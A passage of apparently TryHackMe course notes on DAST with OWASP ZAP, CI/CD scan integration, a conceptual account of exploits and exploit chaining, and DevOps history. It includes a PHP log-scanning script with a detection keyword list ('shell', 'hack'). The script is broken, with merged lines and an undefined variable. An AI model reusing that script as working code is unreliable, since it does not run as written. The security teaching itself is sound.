To do authenticated scans, ZAP will also need you to define at least one user in the **Users** section. This won't be used at all in our case, as our ZEST script embeds the user and password we'll use. However, ZAP needs a user to be defined, or it will just skip authentication altogether.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1a8f38f5a68497ac2440bb108ad04fbe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1a8f38f5a68497ac2440bb108ad04fbe.png)

Once
 this is done, press OK and you should see all of the site's resources 
are now marked with a target icon, meaning they are now part of the 
defined Context.

# Re-spidering the Application

Now
 that we have a context set with our authentication script, let's rerun 
the spider, but setting the correct context and the user we created:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/36544ecae3c4accf94f905d77ce6aa71.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/36544ecae3c4accf94f905d77ce6aa71.png)

This time, ZAP should be able to find any resources that require authentication and weren't detected before. Let's hit the **Start Scan** button
 and see what we get. If you want to see if any new resources were 
discovered during a spidering session, you can always check the **Added Nodes** tab:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ce5af212852eb375ebb04ba68c92cb85.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ce5af212852eb375ebb04ba68c92cb85.png)

ZAP
 has found a couple of additional PHP scripts. One of such scripts is in
 charge of logging a user out, and might pose a problem. If ZAP tries to
 access it, it will log out of its session.

# Avoiding Logouts

To prevent ZAP from logging itself out, we will right-click the logout.php script in the Sites tab and exclude the script from our context:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/822f88eccd14b5cae0a1b7628b19720f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/822f88eccd14b5cae0a1b7628b19720f.png)

Now ZAP
 will avoid interacting with the logout script during spidering or 
scanning. Note that depending on the application, it might be desirable 
to exclude some other scripts as well. Knowing how the application works
 is extremely important to get the most out of the scanning process.

In addition to preventing direct logouts, we can specify indicators for ZAP
 to identify if its session is still active or not, and repeat the login
 script if necessary. This is easily done by selecting parts of a 
response that only appear when you are logged in or logged out.

For example, we know that `cowsay.php` can only be accessed if you have successfully logged in, so it might have good indicators we can use for ZAP. Let's select `cowsay.php` from the Sites tab and select the text that corresponds to the logout link. Right-click the selected text and choose **Flag as Context -> (Your Context Name): Authentication Logged-in indicator:**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d69810f47d95da3ea83578209d03e95c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d69810f47d95da3ea83578209d03e95c.png)

From now on, ZAP
 will search for the logout link on each response. If it isn't present, 
it will assume its session needs to be renewed and log back into the 
application using the ZEST script we recorded.

You can also
 do the same to select a Logged-out indicator. Since we know the login 
link should only be visible if you are logged out, we can use it for 
this purpose by following a similar procedure. Let's grab the link's 
HTML from the `aboutme.php` script in the Sites tab:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e9c500784d6e3c0fa6d83dd2ac776a26.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e9c500784d6e3c0fa6d83dd2ac776a26.png)

We will right-click the selected text and choose Flag as Context -> (Your Context Name): Authentication Logged-out indicator.

Note: It may be possible that ZAP has cached the authenticated response for `aboutme.php`. In that case, you will need to resend a request via the built-in browser to that URL to get the correct pattern.

Now that ZAP has patterns to identify if it is logged in correctly, we need to choose a Verification Strategy to tell
 it how to use the configured patterns correctly. Depending on the 
website you are checking, you will want to use different strategies and 
tune them to suit the target application. In this case, we will use the Poll the Specified URL strategy and tell it to poll the `/aboutme.php` resource
 every 60 requests to check for the logged-in/logged-out patterns. To do
 this, double-click the Context and change the following settings under Authentication:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/82bf35da966f39f6a8e1d01612c41766.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/82bf35da966f39f6a8e1d01612c41766.png)

# Rescanning the Application One Last Time

We
 are finally set up to run a new scan on the application, knowing that 
it will now cover the areas of the application that require 
authentication. Let's go to **Tools -> Active Scan**, and select the **Context** and **User** we created:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ab0ec48b4dc540aa44d5fce75bed3ac5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ab0ec48b4dc540aa44d5fce75bed3ac5.png)

**Checking APIs with ZAP**

Nowadays, web 
applications depend on APIs to perform some or all of their tasks. The 
DAST process we have shown so far involves being able to spider a 
traditional web application, but APIs aren't something that can be 
spidered easily. The endpoints of an API won't normally expose 
information about other endpoints, making the discovery process harder. 
Furthermore, even if we get an endpoint's name, we still need to know 
what parameters can be passed to it.

Instead of spidering APIs, we
 will rely on the development team to give us a precise specification of
 the available endpoints in an API and all of the parameters we can send
 to them. This way, we don't need to spend time on the discovery process
 but can focus on testing its security directly.

# API Descriptions

Several
 standards exist to document APIs, which generally include all the 
information developers would need to build proper requests and know what
 to expect as responses for each of the available endpoints. This is 
also all we need to start testing for security vulnerabilities.

ZAP can import APIs defined by **OpenAPI** (formerly **Swagger**), **SOAP** or **GraphQL**. Depending on the API you are testing, you might get one of these formats from the development team.

To give you a better idea of what these files contain, let's take a look at the one published on [http://10.10.234.128:8081/swagger.json](http://10.10.234.128:8081/swagger.json), which follows the OpenAPI 2.0 standard. Inside the file, you will find a section called `paths`,
 where every single endpoint of the API is listed. For each of the 
endpoints, a complete list of the available parameters is presented. For
 example, here you have the part of the specification on how to interact
 with `/asciiart/{art_id}`:

```
    "/asciiart/{art_id}": {
      "get": {
        "parameters": [
          {
            "description": "art id",
            "in": "path",
            "name": "art_id",
            "required": true,
            "type": "string"
          }
        ],
        "responses": {
          "default": {
            "description": "",
            "schema": {
              "$ref": "#/definitions/ASCIIArt"
            }
          }
        }
      }
    }
```

The file indicates that you can do calls to `/asciiart/{art_id}` using the GET method by sending the `art_id` parameter in the URL, which is a string. You can find similar definitions for other paths as `/asciiart/generate` or `/asciiart/add`.

API
 definition files are expected to be processed by machines, so their 
format might be hard to read. To make it easier for us to understand 
them, some APIs will also provide a more friendly UI that we can use to 
run quick tests and explore the available endpoints. You can go to [http://10.10.234.128:8081/swagger-ui/](http://10.10.234.128:8081/swagger-ui/) to check it.

**Note:**
 Production applications might hide API definitions to prevent external 
attackers from knowing how to interact with them. Remember, you can 
always ask the development team for them if needed (if they exist).

# Importing OpenAPI definitions in ZAP

ZAP
 supports two methods to import API definitions: you can provide an 
offline file or a URL from where to download them. Since our API exposes
 its definition file in [http://10.10.234.128:8081/swagger.json](http://10.10.234.128:8081/swagger.json), let's use the URL option. Go to **Import -> Import an OpenAPI definition from a URL**. Specify the corresponding URL and hit the **Import** button.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9244ab35510e9ede17da5288dec678f1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9244ab35510e9ede17da5288dec678f1.png)

You should now see all of the available endpoints and parameters loaded in the Sites tab.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c5ed878d9c4a18dabcdc7da7ecfb0c82.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c5ed878d9c4a18dabcdc7da7ecfb0c82.png)

ZAP
 will also automatically do passive scanning on the endpoints and report
 some alerts. After importing the API definition, ZAP will treat the API
 as any other normal web page.

# Scanning the API

Once
 an API definition is loaded into ZAP, you can use the available tools 
just as with any other website. To run a scan against the API, 
right-click its URL and select **Attack -> Active Scan**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/88c61f3f3e892283034832da488dfa6a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/88c61f3f3e892283034832da488dfa6a.png)

After
 running the scan, ZAP should have discovered some vulnerabilities in 
the API. Use the results of the scan to answer the questions at the end 
of the task.

**Integrating DAST into the development pipeline**

Generally, when 
discussing DAST, people will refer to implementing automated 
vulnerability scanning into your development pipeline rather than the 
manual process we have covered. In this way, the term differs from what 
you would typically call application pentesting.

Having DAST added to your development process may sound pretty straightforward, but there are some caveats to it:

- We must decide at which stages of the development process we will run scans.
- We must decide what will trigger a scan. We can run scans on each commit made to code or on a scheduled basis.
- We must determine the intensity of each scan. Doing a full vulnerability
scan on a medium-sized application will require significant time, and we don't want to slow down the development team.

Since no 
solution fits all scenarios, determining all of this must be done with 
the help of the development team so that security requirements are met 
without actually creating significant disturbances to their established 
processes.

In this task, we'll examine how we can quickly 
implement DAST directly into the development pipeline to provide early 
visibility of vulnerabilities. The scans will run automatically on each 
commit and will test for a subset of vulnerabilities only to avoid 
introducing long delays in the pipeline.

# Reviewing our CI/CD Pipeline

Our
 current machine implements the entire development pipeline for the web 
application and API you scanned previously. The following two components
 are in charge of doing that:

- A Gitea repository is running on [http://10.10.234.128:3000/](http://10.10.234.128:3000/), where the code for both applications is stored.
- A Jenkins instance that runs the CI/CD pipeline. You can access Jenkins at [http://10.10.234.128:8080/](http://10.10.234.128:8080/).

Every
 time a commit is made in Gitea, Jenkins will take the code from the 
repository and compile it into a Docker instance. These Docker instances
 are what you have scanned so far.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cb91a58ca81963c65e2cc15c7d320d8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cb91a58ca81963c65e2cc15c7d320d8.png)

To access Gitea or Jenkins, you can use the following credentials:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d471dd234b7fc4eb4edea3c934663c1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d471dd234b7fc4eb4edea3c934663c1.png)

| **Username** | thm |
| --- | --- |
| **Password** | thm |

# Running Automated Scans With zap2docker

To integrate ZAP in our pipeline, we will use **zap2docker**, a 
dockerized version of ZAP proxy built with automation as its primary 
purpose. The full documentation for zap2docker can be found [here](https://www.zaproxy.org/docs/docker/).

**Note:**
 The commands in this section are provided for reference only. You don't
 need to run them manually, as we will have Jenkins do it for us later.

To install zap2docker, you can pull it from Docker Hub using the following command:

```
docker pull owasp/zap2docker-stable
```

You can run ZAP from the docker instance using one of the packaged 
scan scripts, which will allow you to run one of the following scan 
profiles:

**Baseline Scan:** ZAP will spider the target 
website for a maximum time of 1 minute. No active scan will be 
performed. You can optionally run an AJAX spider if desired.

```
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://www.example.com
```

**Full Scan:** ZAP will run a spider with no time limits, followed by an active scan.

```
docker run -t owasp/zap2docker-stable zap-full-scan.py -t https://www.example.com
```

**API Scan:** ZAP will perform an active scan against an API. You 
will need to provide a URL to an API description file (OpenAPI, GraphQL 
or SOAP).

```
docker run -t owasp/zap2docker-stable zap-api-scan.py -t https://www.example.com/swagger.json -f openapi
```

In any of the scans, the results for passive scans will be limited to
 10 alerts. In addition to the base commands, you can add the `-j` switch to perform an AJAX scan on the baseline and full scans.

# Integrating ZAP Into the Pipeline

The environment you have access to already has a zap2docker instance 
ready to use. All we need to do is to tell Jenkins to run zap2docker 
with the options we need, and that will be it.

Before going into that, let's explore what we have in Jenkins. When logging into Jenkins, you will find an **organisation** called thm, which contains the two **repositories** for the web application and API. For each of the repositories, you can see the available **branches**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/573d790980b009dc97643c03e6357207.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/573d790980b009dc97643c03e6357207.png)

You will have a single branch in both projects called `main`. If you click on the branch, you will be able to see the builds for it. The `simple-webapp` project, for example, has been built two times already:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49813ba174a02e86bd73d39ec73d1c82.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49813ba174a02e86bd73d39ec73d1c82.png)

For each build, we can see there are two stages configured:

- **Build the Docker image:** This stage will build the Docker container based on the Dockerfile on each project.
- **Deploy the Docker image:** This stage will deploy the Docker container.

Both of these stages are defined in the **Jenkinsfile** in each repository. If we go to Gitea and open the [Jenkinsfile](http://10.10.234.128:3000/thm/simple-webapp/src/branch/main/Jenkinsfile) on the simple-webapp repository, we can see the specific commands run on each of the stages:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/cf141221964b4306947780a09c1f5ef3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/cf141221964b4306947780a09c1f5ef3.png)

In the second stage, you can see how the web application you scanned manually is deployed to port 8082, for example.

If
 we want to incorporate zap2docker into our pipeline, we can add a third
 stage that runs the scan for us after building the container. For your 
convenience, the stage is already defined at the end of the Jenkinsfile,
 and you can uncomment it to get it running. Feel free to use `git` to send a commit to the repository or use Gitea's built-in editor if you find it easier:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/edc92bcb8a4db9cc674e9dc6dcbf887d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/edc92bcb8a4db9cc674e9dc6dcbf887d.png)

Notice that we are running the **Baseline Scan**
 only, as this scan will be run for each commit made to the repository, 
so it isn't sensible to delay the pipeline with a Full Scan that might 
take hours to finish. This scan intends to find low-hanging fruit only. 
This means you won't see any SQL injection, Cross Site Scripting, or 
anything else that requires an active scan.

Since Jenkins will 
catch any changes in the repository, it will start the building process 
immediately after you edit the file. You can switch back to the 
simple-webapp project in Jenkins to see the progress live:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/66397388a1c813a454cb7622db12e884.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/66397388a1c813a454cb7622db12e884.png)

You can see that the current build now adds the `Scan with OWASP ZAP`
 stage. The scan will take around 5 minutes. Once finished, the build 
will fail, as ZAP will find some vulnerabilities in the app. To check 
the report, open the build and go to the **Workspaces** section on the menu:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d91ad74b7900ca2039e91711852c09b2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d91ad74b7900ca2039e91711852c09b2.png)

Here
 you can explore the project files, and ZAP will put its reports in the 
zap-reports folder. Download and examine the report to answer the 
question at the end of the task.

## **WEAPONIZING VULNERABILITIES**

**What is an Exploit?**

An exploit can take 
various forms, such as an executable file designed for a specific 
endpoint, which can be delivered through a text message, an email 
attachment, or even a file that is hidden within digital files. When the
 exploit is executed, an attacker can perform various actions on the 
targeted system, such as controlling it remotely or locally, disrupting 
its functionality, stealing data, or any other activities that the 
system's resources allow.

An exploit can be either 
local or remote. An attacker who already has access to a specific 
computing resource can execute code locally to escalate their 
privileges. They may also install additional malicious code or gain 
remote control of the resource. An attacker who exploits a vulnerability
 remotely over a network or communication channel to gain control of a 
system uses a specific type of exploit, known as a remote exploit. An 
exploit is a technical tool that may be used against any user in a 
standalone or connected cyber environment. In a standalone environment, 
an exploit may be delivered via removable media.

Exploits
 can be developed and financed by various actors, including 
nation-states seeking to engage in cyber espionage or cyber warfare, 
organized criminal groups looking to profit from their activities, and 
hackers on the dark web selling their services to the highest bidder. 
Additionally, some specialized actors look for weaknesses and develop 
exploits for them. It's critical to realize that an exploit is not a 
goal in and of itself. It is a method for carrying out much more 
significant tasks. Exploit creation is a complicated process requiring 
high information security expertise. As a result, it involves highly 
experienced individuals and continuous updates that can fetch a high 
price on niche or illegal markets (mainly on the dark web).

**Vulnerability Lifecycle**

The Department of Defense (DoD) has implemented a [Vulnerability Disclosure Program (VDP)](https://www.dc3.mil/Missions/Vulnerability-Disclosure/Vulnerability-Disclosure-Program-VDP/) that uses the widely recognized [Lifecycle of a Vulnerability Framework](https://thescif.org/lifecycle-of-a-vulnerability-overview-part-one-374a01c73096?gi=8ba01d1d3d89)
 to better understand how vulnerabilities can be mitigated earlier. A 
VDP typically involves the triage, validation, and mitigation 
facilitation of vulnerability reports submitted by researchers. The five
 stages of the Lifecycle of a Vulnerability Framework are **Discovery, Coordination, Mitigation, Management, and Lessons Learned**;
 however, the path a vulnerability follows from identification to 
patching can vary. The following flow displays the different stages of 
the lifecycle of a vulnerability in a more-or-less linear manner.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/010b30ab11a3760f6a43d52cb2782c46.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/010b30ab11a3760f6a43d52cb2782c46.png)

- **Product Launched:** A vendor in the public market launches an information technology product (hardware or software).
- **Vulnerability Discovery (Public or Private):** Researchers working independently or sponsored by private/public organizations for
various interests discover vulnerabilities in the product. A 0-day
vulnerability is one that has yet to be made public after being found.
In any other case, when a vulnerability is found, it is made available
to the general public via the internet or other special sources. Before
the vulnerability is publicly disclosed online, the manufacturer
typically has already developed a patch or update for the product at
this stage.
- **Development of a Proof of Concept (PoC) or Exploit:** A PoC proving the exploitability of the newly discovered vulnerability is
prepared in-house by the vendor or received from bug bounty
hunters/independent researchers. It is crucial at this stage to keep the vulnerability disclosure discrete as the PoC is typically the first
stage in developing an exploit, and bad actors can use it in the wild.
- **Patch Development or Update:** The product manufacturer creates a patch or update to prevent the known vulnerability from being exploited by adversaries.
- **Patch Release:** The product manufacturer releases the patch for the vulnerability so the
customers can apply it to the product in their environment.
- **Patch Install:** The customer or end-users update or patch their systems, so the known vulnerability cannot be used against it.

**Opportunity for Weaponizing Vulnerabilities**

Weaponizing 
vulnerabilities or creating exploits based on existing vulnerabilities 
is a process that requires a deep understanding of the target resource, 
whether it be software, hardware, or any other system that is being 
exploited. Creating an exploit involves steps that vary depending on the
 target system. It takes **time, expertise, and knowledge of the target** technology to be weaponized or exploitable.

A vulnerability may be weaponized by **locally developing an exploit or purchasing it from suppliers**
 in underground forums or specialized marketplaces. The flow chart shows
 an annotated picture highlighting the opportunity period for 
weaponizing a vulnerability.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e0bed60e9d9bd82ec747e4fac57d2c30.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e0bed60e9d9bd82ec747e4fac57d2c30.png)

The
 window of opportunity for resource exploitation varies and depends on 
several factors, including update availability, discovery time, and 
failure severity. Exploiting **0-day vulnerabilities can take a few days to several months or even years**.
 Since 0-day attacks are typically targeted at specific targets, finding
 them takes time and effort. In the above figure, the n-day refers to an
 exploit with a patch available. Here "**n**" refers to the number of days elapsed since the patch was released.

As mentioned above, the date when a vulnerability has first been discovered is typically unknown; however, the CVE
 database shows the dates of CVE-ID assignments and publications. CVEs 
are often released as soon as the vendors push out the patch. **Adversaries with access to the updated software can reverse-engineer the patch to find the vulnerability**. According to the [Exploit Database](https://www.exploit-db.com/),
 most public exploits are created in the first week following the 
release of a patch. To offer their clients more time to upgrade, certain
 manufacturers might postpone the CVE
 announcement. When a CVE is formally released, the public can 
immediately access information about the vulnerability. Most security 
providers begin creating their vulnerability signatures and prevention 
strategies at this time to ensure mitigation from threat actors.

**Exploit Chaining**

Chaining exploits in tandem, also known as "**exploit chaining**" or "**multi-stage exploitation**",
 is a technique hackers use to string together multiple exploits for 
vulnerabilities to gain complete control of a target system. The desired
 goal is to develop a complete **Remote Code Execution (RCE) chain**, allowing the attacker to execute arbitrary code on the target system with the highest privileges.

- **Reconnaissance:** The attacker will gather information about the target system and its
vulnerabilities. This can be done through various methods, such as
network scanning, port scanning, and vulnerability scanning.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6db928385248e0724b3f785390be98fc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6db928385248e0724b3f785390be98fc.png)
    
- **Initial Exploit:** The attacker will use the information gathered during the reconnaissance
phase to identify an initial vulnerability that can be exploited, which
could be known and that has not been patched. The attacker will use an
exploit that takes advantage of this vulnerability to gain access to the target system.
- **Privilege Escalation:** This will allow
them to access sensitive information, such as login credentials and
system files, and execute code with higher privileges.
- **Persistence:** The attacker will use other exploits to establish persistence on the target system, allowing them to maintain access even if the initial exploit is discovered and patched.
- **Lateral Movement:** The attacker
will then use additional exploits to move laterally through the target
system's network and compromise other systems. This will allow them to
gain access to additional sensitive information and resources.
- **RCE**: Once the attacker has established persistence and moved laterally
through the network, they will use the final exploit in the chain to
gain RCE. This may include using malware to gain control of the target system or a privilege escalation exploit to gain access to the target system's
kernel.

It is important to note that chaining 
exploits in tandem can be a highly effective technique for attackers, as
 it allows them to bypass multiple layers of security and gain access to
 sensitive information and resources. Therefore, organizations must keep
 their systems updated and patched and implement proper network 
segmentation and best security practices to minimize the risk of such 
attacks.

**Automating Common Tasks**

You have seen 
how attackers can chain multiple vulnerabilities to exploit a system. 
Now, you will see how automation can help security engineers improve an 
organization's overall security posture. Without automation, tasks can 
be time-consuming and prone to human error. However, automating the 
processes helps the security engineer identify and remediate 
vulnerabilities more effectively, reducing the risk of a successful 
cyber attack on the organization's network. Several ways to automate 
these tasks include scripts, scheduling tools, and platforms that offer 
security orchestration, automation, and response (SOAR) capabilities.

- **Scripts**: One way to automate everyday tasks and security checks is to use scripts. Scripting languages like Python, PowerShell, and Bash can automate many tasks, including system administration,
security checks, and data analysis. Scripts can automate repetitive
tasks, such as scanning for vulnerabilities, monitoring network traffic, and collecting log data. Additionally, scripts can be used to perform
complex tasks, such as automating incident response procedures and
analyzing large data sets. For example, you can create a small script in PHP to go through log files and identify any malicious URLs or
keywords:
    
    findKeywords.php
    
    ```
    <?php
    
    $malicious_keywords = array('shell', 'apt', 'sql_error', 'hack'); // list of bad words$path = 'error_log.txt'; //path to the file$file = fopen($path, 'r'); //open filewhile(!feof($file)) {  $line = fgets($file);  foreach($keywords as $keyword) {    if(strpos($line, $keyword) !== false) { //match the keyword      echo "The malicious keyword '$keyword' was found in the file.\n";
        }
      }
    }
    fclose($file);?>
    
    ```
    
- **Scheduling Tools**: Scheduling tools are another way to
automate common tasks and security checks. Scheduling tools such as cron jobs and Windows Task Scheduler can be used to schedule scripts to run
at specific times. This allows organizations to automate vulnerability
scans, backups, and software updates. For example, a security engineer
can use a vulnerability scanner tool that automates identifying and
analyzing vulnerabilities in the organization's network. The tool can
scan the **network regularly, detecting vulnerabilities** that may
have been introduced since the last scan. The tool can then generate
reports on the vulnerabilities found, categorizing them by severity and
providing recommended actions to remediate them.
- **SOAR Platforms**: A third way to automate everyday tasks and security checks is to use
Security Orchestration, Automation and Response Platforms. These
platforms provide a centralized management interface for automating and
orchestrating security tasks. They can automate incident response,
threat hunting, and incident management tasks. Additionally, they can be used to integrate with other security tools such as Firewalls,
Intrusion Detection Systems, and **S**ecurity **I**nformation and **E**vent **M**anagement (SIEM) systems. [Shuffler.io](https://shuffler.io/) and [Splunk](https://tryhackme.com/room/splunk101) are a few of the renowned [SOAR](https://tryhackme.com/room/soar) Platforms that you can explore.

When automating tasks and security checks, it is important to consider the following best practices:

- Test your scripts and automation tools in a controlled environment before deploying them in production.
- Ensure that your scripts and automation tools are well-documented and easy to understand.
- Use logging and monitoring to keep track of the tasks that have been automated.
- Review your automation and security checks regularly to ensure they are still practical and relevant.
- Keep your scripts and automation tools updated and patched to address any security vulnerabilities.

In
 summary, automating common tasks and security checks can help 
organizations streamline operations and improve their overall security 
posture. When implementing automation, it is important to consider best 
practices such as testing, documentation, logging and monitoring, 
regular review, and security updates.

**Conclusion**

In
 this room, we have learned about the lifecycle of a vulnerability, how 
exploits are developed, and how to chain multiple vulnerabilities to get
 complete control of a system. Moreover, we have also briefly discussed 
how we could automate routine tasks to assist a security engineer.

In
 summary, creating exploits based on existing vulnerabilities is a 
complex process involving discovering vulnerabilities, research, exploit
 development, testing, and deployment. However, vulnerabilities and 
exploits must be dealt with using extreme care, and all testing should 
be carried out in an isolated environment to avoid infecting one's own 
system.

## **INTRODUCTION TO DEVSECOPS**

**DevOps: A New Hope**

Since its inception, Developer Operations (DevOps)
 has become a significant influence in modern Software Development, 
Deployment and Operations. But where did the term come from?

---

**The story of**

A long time ago, there were waterfalls in a galaxy far, far away.

**Waterfall Model**

This is the name given to how project management was approached back in
 the day (the 70s). The cycle constituted and relied on a *hierarchy,* where
 every member had a specific responsibility. For example, System admins 
worked tirelessly to keep everything running smoothly and afloat. 
Developers build and add as many features as possible, and finally, 
Quality Assurance (QA) engineers test the system's functionality, 
ensuring everything works as expected.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/21ff900651b19689600a2a7d0cd2fcea.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/21ff900651b19689600a2a7d0cd2fcea.png)

If
 anything troubles the servers or something needs deployment, sysadmins 
will jump on it. If it's a code problem, devs will put out the fire. If 
there is anything to do with testing functionality and feedback, Quality
 Assurance teams will take care of it. But what if there is a flaw? A 
bug? Who fixes it? These situations led to many blame games and passing 
the baton around that created friction, things would get backlogged, and
 the symbiosis between teams would end up not working anymore. As the 
number of customer expectations grew, features and new releases 
increased. Responsibilities and tasks would end up being an 
accumulative, giant mess. Bugs and security flaws were backlogged, 
plenty of these unresolved, and more releases scheduled, which would be 
not scalable and messy. Excessive noise and pressure led to distrust, 
communication gaps, and friction between teams.

This popular 
problem-solving strategy and system became a root cause of 
ineffectiveness in flexibility and communication across teams.

**Agile Model**

With
 the challenges teams were facing with waterfall, businesses started 
developing ways that allowed more flexibility and adaptability. 
Somewhere in early 2000,  **The Agile Methodology** was coined. Soon, a manifesto was released: [Agile Manifesto](http://agilemanifesto.org/), emphasising four values for agile development:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/db09323bd5eed6fb32de796bdb20196f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/db09323bd5eed6fb32de796bdb20196f.png)

- Individuals and interactions over processes and tools
- Working software over comprehensive documentation
- Customer collaboration over contract negotiation
- Responding to change vs following a plan

Companies
 now value team collaboration and rely on self-organising teams, 
focusing on clients and plenty of room for change and flexibility.

But something was still missing.

**DevOps**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/c31ab1829b8c9ef8850f90e38a4224f6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/c31ab1829b8c9ef8850f90e38a4224f6.png)

In
 2008, a conversation between Andrew Clay and Patrick Debois led to 
something quite revolutionary. While discussing the drawbacks of Agile, DevOps
 was born. After an event in Belgium the following year called 
"DevOpsDays," DevOps became the next buzzword, and its popularity 
increased.

DevOps
 is quite different from the previous methodologies because it focuses 
on driving "cultural change" to increase efficiency. It does this by 
uniting the magic of all teams working on a project, using integration 
and automation. With these ingredients, you get a cross-integration 
across all departments, QA+sysadmins+developers. For example, ensuring 
developers can now be involved in deployment and sysadmins can now write
 scripts, QA can figure out how to fix flaws vs constantly testing for 
functionality. By introducing automation and integration of systems, 
these engineers can now have the same visibility at all times and 
interact accordingly. We will dive more into how DevOps does this in the
 latter rooms as we talk about pipelines, automation, Continuous 
Integration and Continuous Delivery (CI/CD).

# Why is important?

DevOps
 builds a philosophy that emphasises building trust and better liaising 
between 
developers and other teams (sysadmins, QA, etc.). This helps the 
organisation align technological projects to business requirements, 
increasing the impact and value to the business as projects become more 
efficient and prioritised accordingly. Changes rolled
 out are usually small and reversible, visible to all teams involved. 
This ensures better contribution and communication that helps with the 
pace and an increased competency when delivering work.

**
In Summary:**

Thanks to the advent of DevOps, today's development infrastructure is fully automated and operates on a self-service basis:

# 

- Developers can provide resources to public clouds without depending on IT to
provision infrastructure, which in the past led to weeks to months of
delays.
- Continuous integration and deployment (CI/CD) processes automatically
set up testing, staging, and production environments in the cloud or
on-premises. They can be decommissioned, scaled, or re-configured as
needed.
- Infrastructure-as-Code (IaC) is widely used to deploy environments declaratively*, using tools
like Terraform and Vagrant.
- Organisations can now provision containerised workloads
dynamically using automated, adaptive processes
- The
declarative approach requires that users specify the end state of the
infrastructure - for example, deploy these machines in a running state
directly into an environment, automating the configuration choices
throughout the workflow. The software builds it and releases it with no
human interaction.

The imperative/procedural approach takes 
action to configure systems in a series of actionable steps. For 
example, you might declare to deploy a new version of the software and 
automate a series of steps to get a deployment-ready state. You choose 
when to apply those changes at the end by adding a "gate" this gate 
could be a button to release the changes, e.g. "deploy changes" button, 
after all the automated checks and new configurations pass.

In 
such a workflow, even a tiny problem could create a mess. Moreover, as 
the number of new releases increases (the actual case), the whole matter
 may turn disastrous. Things would surely go out of hand with an issue 
still unresolved and plenty of features scheduled to be released.

Read more at: [https://www.appknox.com/blog/history-of-devops](https://www.appknox.com/blog/history-of-devops)

**The Infinite Loop**

**In
 the previous task, we learned about the different software development 
